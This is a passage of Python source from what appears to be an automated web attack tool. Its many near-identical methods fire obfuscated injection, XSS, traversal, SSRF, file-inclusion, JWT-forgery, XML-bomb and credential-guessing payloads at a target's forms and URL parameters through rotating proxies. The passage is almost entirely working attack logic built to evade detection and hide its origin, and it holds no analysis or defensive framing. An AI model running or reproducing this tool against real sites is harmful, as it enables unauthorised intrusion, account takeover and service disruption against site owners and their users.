                            response = self.submit_form(form, self.target_url, obfuscated_payload, input["name"])
                            
                            if self.check_ldap_injection(response):
                                vuln = {
                                    "type": "LDAP Injection",
                                    "url": self.target_url,
                                    "method": form["method"],
                                    "parameter": input["name"],
                                    "payload": obfuscated_payload,
                                    "evidence": "LDAP error detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] LDAP Injection found: {input['name']} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                # Test URL parameters
                parsed_url = urllib.parse.urlparse(self.target_url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        for payload in self.exploit_payloads["ldap_injection"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            test_params = params.copy()
                            test_params[param] = obfuscated_payload
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                            
                            response = requests.get(test_url, proxies=proxy_dict, verify=False, timeout=10)
                            
                            if self.check_ldap_injection(response):
                                vuln = {
                                    "type": "LDAP Injection",
                                    "url": self.target_url,
                                    "method": "GET",
                                    "parameter": param,
                                    "payload": obfuscated_payload,
                                    "evidence": "LDAP error detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] LDAP Injection found: {param} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def xxe_injection_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Get forms from target
                response = requests.get(self.target_url, proxies=proxy_dict, verify=False, timeout=10)
                forms = self.get_forms(self.target_url, response)
                
                for form in forms:
                    for input in form["inputs"]:
                        if input["type"] == "hidden" or input["type"] == "submit":
                            continue
                        
                        for payload in self.exploit_payloads["xxe_injection"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            response = self.submit_form(form, self.target_url, obfuscated_payload, input["name"])
                            
                            if self.check_xxe_injection(response):
                                vuln = {
                                    "type": "XXE Injection",
                                    "url": self.target_url,
                                    "method": form["method"],
                                    "parameter": input["name"],
                                    "payload": obfuscated_payload,
                                    "evidence": "XXE error detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] XXE Injection found: {input['name']} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                # Test URL parameters
                parsed_url = urllib.parse.urlparse(self.target_url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        for payload in self.exploit_payloads["xxe_injection"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            test_params = params.copy()
                            test_params[param] = obfuscated_payload
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                            
                            response = requests.get(test_url, proxies=proxy_dict, verify=False, timeout=10)
                            
                            if self.check_xxe_injection(response):
                                vuln = {
                                    "type": "XXE Injection",
                                    "url": self.target_url,
                                    "method": "GET",
                                    "parameter": param,
                                    "payload": obfuscated_payload,
                                    "evidence": "XXE error detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] XXE Injection found: {param} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def xpath_injection_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Get forms from target
                response = requests.get(self.target_url, proxies=proxy_dict, verify=False, timeout=10)
                forms = self.get_forms(self.target_url, response)
                
                for form in forms:
                    for input in form["inputs"]:
                        if input["type"] == "hidden" or input["type"] == "submit":
                            continue
                        
                        for payload in self.exploit_payloads["xpath_injection"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            response = self.submit_form(form, self.target_url, obfuscated_payload, input["name"])
                            
                            if self.check_xpath_injection(response):
                                vuln = {
                                    "type": "XPath Injection",
                                    "url": self.target_url,
                                    "method": form["method"],
                                    "parameter": input["name"],
                                    "payload": obfuscated_payload,
                                    "evidence": "XPath error detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] XPath Injection found: {input['name']} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                # Test URL parameters
                parsed_url = urllib.parse.urlparse(self.target_url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        for payload in self.exploit_payloads["xpath_injection"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            test_params = params.copy()
                            test_params[param] = obfuscated_payload
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                            
                            response = requests.get(test_url, proxies=proxy_dict, verify=False, timeout=10)
                            
                            if self.check_xpath_injection(response):
                                vuln = {
                                    "type": "XPath Injection",
                                    "url": self.target_url,
                                    "method": "GET",
                                    "parameter": param,
                                    "payload": obfuscated_payload,
                                    "evidence": "XPath error detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] XPath Injection found: {param} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def ssi_injection_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Get forms from target
                response = requests.get(self.target_url, proxies=proxy_dict, verify=False, timeout=10)
                forms = self.get_forms(self.target_url, response)
                
                for form in forms:
                    for input in form["inputs"]:
                        if input["type"] == "hidden" or input["type"] == "submit":
                            continue
                        
                        for payload in self.exploit_payloads["ssi_injection"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            response = self.submit_form(form, self.target_url, obfuscated_payload, input["name"])
                            
                            if self.check_ssi_injection(response):
                                vuln = {
                                    "type": "SSI Injection",
                                    "url": self.target_url,
                                    "method": form["method"],
                                    "parameter": input["name"],
                                    "payload": obfuscated_payload,
                                    "evidence": "SSI error detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] SSI Injection found: {input['name']} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                # Test URL parameters
                parsed_url = urllib.parse.urlparse(self.target_url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        for payload in self.exploit_payloads["ssi_injection"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            test_params = params.copy()
                            test_params[param] = obfuscated_payload
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                            
                            response = requests.get(test_url, proxies=proxy_dict, verify=False, timeout=10)
                            
                            if self.check_ssi_injection(response):
                                vuln = {
                                    "type": "SSI Injection",
                                    "url": self.target_url,
                                    "method": "GET",
                                    "parameter": param,
                                    "payload": obfuscated_payload,
                                    "evidence": "SSI error detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] SSI Injection found: {param} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def xss_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Get forms from target
                response = requests.get(self.target_url, proxies=proxy_dict, verify=False, timeout=10)
                forms = self.get_forms(self.target_url, response)
                
                for form in forms:
                    for input in form["inputs"]:
                        if input["type"] == "hidden" or input["type"] == "submit":
                            continue
                        
                        for payload in self.exploit_payloads["xss"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            response = self.submit_form(form, self.target_url, obfuscated_payload, input["name"])
                            
                            if self.check_xss(response, obfuscated_payload):
                                vuln = {
                                    "type": "XSS",
                                    "url": self.target_url,
                                    "method": form["method"],
                                    "parameter": input["name"],
                                    "payload": obfuscated_payload,
                                    "evidence": "XSS detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] XSS found: {input['name']} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                # Test URL parameters
                parsed_url = urllib.parse.urlparse(self.target_url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        for payload in self.exploit_payloads["xss"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            test_params = params.copy()
                            test_params[param] = obfuscated_payload
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                            
                            response = requests.get(test_url, proxies=proxy_dict, verify=False, timeout=10)
                            
                            if self.check_xss(response, obfuscated_payload):
                                vuln = {
                                    "type": "XSS",
                                    "url": self.target_url,
                                    "method": "GET",
                                    "parameter": param,
                                    "payload": obfuscated_payload,
                                    "evidence": "XSS detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] XSS found: {param} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def path_traversal_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Get forms from target
                response = requests.get(self.target_url, proxies=proxy_dict, verify=False, timeout=10)
                forms = self.get_forms(self.target_url, response)
                
                for form in forms:
                    for input in form["inputs"]:
                        if input["type"] == "hidden" or input["type"] == "submit":
                            continue
                        
                        for payload in self.exploit_payloads["path_traversal"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            response = self.submit_form(form, self.target_url, obfuscated_payload, input["name"])
                            
                            if self.check_path_traversal(response):
                                vuln = {
                                    "type": "Path Traversal",
                                    "url": self.target_url,
                                    "method": form["method"],
                                    "parameter": input["name"],
                                    "payload": obfuscated_payload,
                                    "evidence": "Path traversal detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] Path Traversal found: {input['name']} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                # Test URL parameters
                parsed_url = urllib.parse.urlparse(self.target_url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        for payload in self.exploit_payloads["path_traversal"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            test_params = params.copy()
                            test_params[param] = obfuscated_payload
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                            
                            response = requests.get(test_url, proxies=proxy_dict, verify=False, timeout=10)
                            
                            if self.check_path_traversal(response):
                                vuln = {
                                    "type": "Path Traversal",
                                    "url": self.target_url,
                                    "method": "GET",
                                    "parameter": param,
                                    "payload": obfuscated_payload,
                                    "evidence": "Path traversal detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] Path Traversal found: {param} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def ssrf_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Get forms from target
                response = requests.get(self.target_url, proxies=proxy_dict, verify=False, timeout=10)
                forms = self.get_forms(self.target_url, response)
                
                for form in forms:
                    for input in form["inputs"]:
                        if input["type"] == "hidden" or input["type"] == "submit":
                            continue
                        
                        for payload in self.exploit_payloads["ssrf"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            response = self.submit_form(form, self.target_url, obfuscated_payload, input["name"])
                            
                            if self.check_ssrf(response):
                                vuln = {
                                    "type": "SSRF",
                                    "url": self.target_url,
                                    "method": form["method"],
                                    "parameter": input["name"],
                                    "payload": obfuscated_payload,
                                    "evidence": "SSRF detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] SSRF found: {input['name']} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                # Test URL parameters
                parsed_url = urllib.parse.urlparse(self.target_url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        for payload in self.exploit_payloads["ssrf"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            test_params = params.copy()
                            test_params[param] = obfuscated_payload
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                            
                            response = requests.get(test_url, proxies=proxy_dict, verify=False, timeout=10)
                            
                            if self.check_ssrf(response):
                                vuln = {
                                    "type": "SSRF",
                                    "url": self.target_url,
                                    "method": "GET",
                                    "parameter": param,
                                    "payload": obfuscated_payload,
                                    "evidence": "SSRF detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] SSRF found: {param} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def rfi_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Get forms from target
                response = requests.get(self.target_url, proxies=proxy_dict, verify=False, timeout=10)
                forms = self.get_forms(self.target_url, response)
                
                for form in forms:
                    for input in form["inputs"]:
                        if input["type"] == "hidden" or input["type"] == "submit":
                            continue
                        
                        for payload in self.exploit_payloads["rfi"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            response = self.submit_form(form, self.target_url, obfuscated_payload, input["name"])
                            
                            if self.check_rfi(response):
                                vuln = {
                                    "type": "RFI",
                                    "url": self.target_url,
                                    "method": form["method"],
                                    "parameter": input["name"],
                                    "payload": obfuscated_payload,
                                    "evidence": "RFI detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] RFI found: {input['name']} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                # Test URL parameters
                parsed_url = urllib.parse.urlparse(self.target_url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        for payload in self.exploit_payloads["rfi"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            test_params = params.copy()
                            test_params[param] = obfuscated_payload
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                            
                            response = requests.get(test_url, proxies=proxy_dict, verify=False, timeout=10)
                            
                            if self.check_rfi(response):
                                vuln = {
                                    "type": "RFI",
                                    "url": self.target_url,
                                    "method": "GET",
                                    "parameter": param,
                                    "payload": obfuscated_payload,
                                    "evidence": "RFI detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] RFI found: {param} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def lfi_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Get forms from target
                response = requests.get(self.target_url, proxies=proxy_dict, verify=False, timeout=10)
                forms = self.get_forms(self.target_url, response)
                
                for form in forms:
                    for input in form["inputs"]:
                        if input["type"] == "hidden" or input["type"] == "submit":
                            continue
                        
                        for payload in self.exploit_payloads["lfi"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            response = self.submit_form(form, self.target_url, obfuscated_payload, input["name"])
                            
                            if self.check_lfi(response):
                                vuln = {
                                    "type": "LFI",
                                    "url": self.target_url,
                                    "method": form["method"],
                                    "parameter": input["name"],
                                    "payload": obfuscated_payload,
                                    "evidence": "LFI detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] LFI found: {input['name']} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                # Test URL parameters
                parsed_url = urllib.parse.urlparse(self.target_url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        for payload in self.exploit_payloads["lfi"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            test_params = params.copy()
                            test_params[param] = obfuscated_payload
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                            
                            response = requests.get(test_url, proxies=proxy_dict, verify=False, timeout=10)
                            
                            if self.check_lfi(response):
                                vuln = {
                                    "type": "LFI",
                                    "url": self.target_url,
                                    "method": "GET",
                                    "parameter": param,
                                    "payload": obfuscated_payload,
                                    "evidence": "LFI detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] LFI found: {param} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def jwt_none_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Check for JWT in cookies
                cookies = {}
                if "Cookie" in self.session.headers:
                    cookie_str = self.session.headers["Cookie"]
                    for cookie in cookie_str.split(";"):
                        cookie = cookie.strip()
                        if "=" in cookie:
                            name, value = cookie.split("=", 1)
                            cookies[name] = value
                
                for name, value in cookies.items():
                    if self.is_jwt(value):
                        for payload in self.exploit_payloads["jwt_none"]:
                            modified_jwt = value.split(".")[0] + "." + payload
                            cookies[name] = modified_jwt
                            
                            headers = {"Cookie": "; ".join([f"{k}={v}" for k, v in cookies.items()])}
                            response = requests.get(self.target_url, headers=headers, proxies=proxy_dict, verify=False, timeout=10)
                            
                            if self.check_jwt_none(response):
                                vuln = {
                                    "type": "JWT None Algorithm",
                                    "url": self.target_url,
                                    "parameter": "Cookie",
                                    "payload": modified_jwt,
                                    "evidence": "JWT None Algorithm bypass detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] JWT None Algorithm found in {name} cookie")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                # Check for JWT in Authorization header
                auth_headers = ["Authorization", "X-Auth-Token", "X-API-Key"]
                for header in auth_headers:
                    if header in self.session.headers:
                        token = self.session.headers[header]
                        if header == "Authorization" and token.startswith("Bearer "):
                            token = token[7:]
                        
                        if self.is_jwt(token):
                            for payload in self.exploit_payloads["jwt_none"]:
                                modified_jwt = token.split(".")[0] + "." + payload
                                
                                headers = {header: f"Bearer {modified_jwt}"} if header == "Authorization" else {header: modified_jwt}
                                response = requests.get(self.target_url, headers=headers, proxies=proxy_dict, verify=False, timeout=10)
                                
                                if self.check_jwt_none(response):
                                    vuln = {
                                        "type": "JWT None Algorithm",
                                        "url": self.target_url,
                                        "parameter": header,
                                        "payload": modified_jwt,
                                        "evidence": "JWT None Algorithm bypass detected"
                                    }
                                    self.vuln_queue.put(vuln)
                                    print(f"{Fore.GREEN}[!] JWT None Algorithm found in {header} header")
                                    break
                                
                                self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def is_jwt(self, token):
        parts = token.split(".")
        if len(parts) != 3:
            return False
        
        try:
            # Try to decode header and payload
            header = base64.urlsafe_b64decode(parts[0] + "=" * (4 - len(parts[0]) % 4))
            payload = base64.urlsafe_b64decode(parts[1] + "=" * (4 - len(parts[1]) % 4))
            return True
        except:
            return False
    
    def xml_bomb_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Get forms from target
                response = requests.get(self.target_url, proxies=proxy_dict, verify=False, timeout=10)
                forms = self.get_forms(self.target_url, response)
                
                for form in forms:
                    for input in form["inputs"]:
                        if input["type"] == "hidden" or input["type"] == "submit":
                            continue
                        
                        for payload in self.exploit_payloads["xml_bomb"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            start_time = time.time()
                            response = self.submit_form(form, self.target_url, obfuscated_payload, input["name"])
                            end_time = time.time()
                            
                            if self.check_xml_bomb(response, end_time - start_time):
                                vuln = {
                                    "type": "XML Bomb",
                                    "url": self.target_url,
                                    "method": form["method"],
                                    "parameter": input["name"],
                                    "payload": obfuscated_payload,
                                    "evidence": f"Time delay: {end_time - start_time} seconds"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] XML Bomb found: {input['name']} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                # Test URL parameters
                parsed_url = urllib.parse.urlparse(self.target_url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        for payload in self.exploit_payloads["xml_bomb"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            test_params = params.copy()
                            test_params[param] = obfuscated_payload
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                            
                            start_time = time.time()
                            response = requests.get(test_url, proxies=proxy_dict, verify=False, timeout=10)
                            end_time = time.time()
                            
                            if self.check_xml_bomb(response, end_time - start_time):
                                vuln = {
                                    "type": "XML Bomb",
                                    "url": self.target_url,
                                    "method": "GET",
                                    "parameter": param,
                                    "payload": obfuscated_payload,
                                    "evidence": f"Time delay: {end_time - start_time} seconds"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] XML Bomb found: {param} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def weak_credentials_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Get forms from target
                response = requests.get(self.target_url, proxies=proxy_dict, verify=False, timeout=10)
                forms = self.get_forms(self.target_url, response)
                
                for form in forms:
                    username_field = None
                    password_field = None
                    
                    for input in form["inputs"]:
                        if input["type"] == "password":
                            password_field = input["name"]
                        if input["name"] in ["username", "user", "login", "email"]:
                            username_field = input["name"]
                    
                    if username_field and password_field:
                        for username, password in self.exploit_payloads["weak_credentials"]:
                            data = {}
                            for input in form["inputs"]:
                                if input["name"] == username_field:
                                    data[input["name"]] = username
                                elif input["name"] == password_field:
                                    data[input["name"]] = password
                                else:
                                    data[input["name"]] = input["value"]
                            
                            if form["method"] == "post":
                                response = requests.post(form["action"], data=data, proxies=proxy_dict, verify=False, timeout=10)
                            else:
                                response = requests.get(form["action"], params=data, proxies=proxy_dict, verify=False, timeout=10)
                            
                            if self.check_weak_credentials(response):
                                vuln = {
                                    "type": "Weak Credentials",
                                    "url": self.target_url,
                                    "method": form["method"],
                                    "username": username,
                                    "password": password,
                                    "evidence": "Weak credentials found"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] Weak Credentials found: {username}:{password}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def idor_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Test URL parameters
                parsed_url = urllib.parse.urlparse(self.target_url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        if param in ["id", "user_id", "account_id", "uid"]:
                            original_value = params[param][0]
                            
                            # Try to increment the ID
                            try:
                                incremented_value = str(int(original_value) + 1)
                                test_params = params.copy()
                                test_params[param] = incremented_value
                                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                                
                                response = requests.get(test_url, proxies=proxy_dict, verify=False, timeout=10)
                                
                                if self.check_idor(response):
                                    vuln = {
                                        "type": "IDOR",
                                        "url": self.target_url,
                                        "method": "GET",
                                        "parameter": param,
                                        "payload": incremented_value,
                                        "evidence": f"Accessed resource with ID {incremented_value}"
                                    }
                                    self.vuln_queue.put(vuln)
                                    print(f"{Fore.GREEN}[!] IDOR found: {param} parameter in {self.target_url}")
                                    break
                                
                                self.stats_queue.put(("request", response.status_code))
                            except:
                                pass
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def csrf_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Get forms from target
                response = requests.get(self.target_url, proxies=proxy_dict, verify=False, timeout=10)
                forms = self.get_forms(self.target_url, response)
                
                for form in forms:
                    # Check if form is sensitive (has password field or action suggests state change)
                    is_sensitive = False
                    for input in form["inputs"]:
                        if input["type"] == "password":
                            is_sensitive = True
                            break
                    
                    if not is_sensitive:
                        action = form["action"].lower()
                        if any(keyword in action for keyword in ["delete", "update", "change", "edit", "add", "create", "remove"]):
                            is_sensitive = True
                    
                    if is_sensitive:
                        # Check for CSRF token
                        has_csrf_token = False
                        for input in form["inputs"]:
                            if input["name"] in ["csrf_token", "csrfmiddlewaretoken", "_token", "authenticity_token"]:
                                has_csrf_token = True
                                break
                        
                        if not has_csrf_token:
                            # Try to submit form without CSRF token
                            data = {}
                            for input in form["inputs"]:
                                if input["type"] != "submit" and input["type"] != "button":
                                    data[input["name"]] = input["value"]
                            
                            if form["method"] == "post":
                                response = requests.post(form["action"], data=data, proxies=proxy_dict, verify=False, timeout=10)
                            else:
                                response = requests.get(form["action"], params=data, proxies=proxy_dict, verify=False, timeout=10)
                            
                            if self.check_csrf(response):
                                vuln = {
                                    "type": "CSRF",
                                    "url": self.target_url,
                                    "method": form["method"],
                                    "evidence": "Sensitive form without CSRF token"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] CSRF found: Sensitive form without CSRF token in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def cors_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Test with origin header
                for header, value in self.exploit_payloads["cors"]:
                    headers = {header: value}
                    response = requests.get(self.target_url, headers=headers, proxies=proxy_dict, verify=False, timeout=10)
                    
                    if self.check_cors(response):
                        vuln = {
                            "type": "CORS Misconfiguration",
                            "url": self.target_url,
                            "header": f"{header}: {value}",
                            "evidence": "CORS misconfiguration detected"
                        }
                        self.vuln_queue.put(vuln)
                        print(f"{Fore.GREEN}[!] CORS Misconfiguration found: {header}: {value}")
                        break
                    
                    self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def http_methods_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Test dangerous HTTP methods
                for method in self.exploit_payloads["http_methods"]:
                    response = requests.request(method, self.target_url, proxies=proxy_dict, verify=False, timeout=10)
                    
                    if response.status_code == 200:
                        vuln = {
                            "type": "Dangerous HTTP Method",
                            "url": self.target_url,
                            "method": method,
                            "evidence": f"Method {method} is allowed"
                        }
                        self.vuln_queue.put(vuln)
                        print(f"{Fore.GREEN}[!] Dangerous HTTP Method found: {method} is allowed")
                        break
                    
                    self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def backup_files_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
